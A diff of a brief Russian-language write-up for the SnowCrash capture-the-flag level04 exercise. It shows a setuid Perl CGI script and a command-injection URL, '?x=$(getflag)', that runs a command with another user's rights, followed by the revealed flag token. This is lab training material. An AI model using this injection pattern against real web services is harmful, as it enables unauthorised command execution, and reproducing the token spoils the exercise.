@@ -5,6 +5,8 @@ level04@SnowCrash:~$ ls -la
 -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
 …
 
+Снова suid флаг
+
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
@@ -15,8 +17,8 @@ sub x {
 }
 x(param("x"));
 
-из это файла понятно что слушается порт 4747 и считываются параметры с url, следовательно мы можем оттуда запустить команду с правами flag04
+из это файла понятно что слушается порт 4747 и считываются параметры с url, следовательно мы можем из браузера запустить команду в url с правами flag04
 
 http://localhost:4747/?x=$(getflag)
-Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
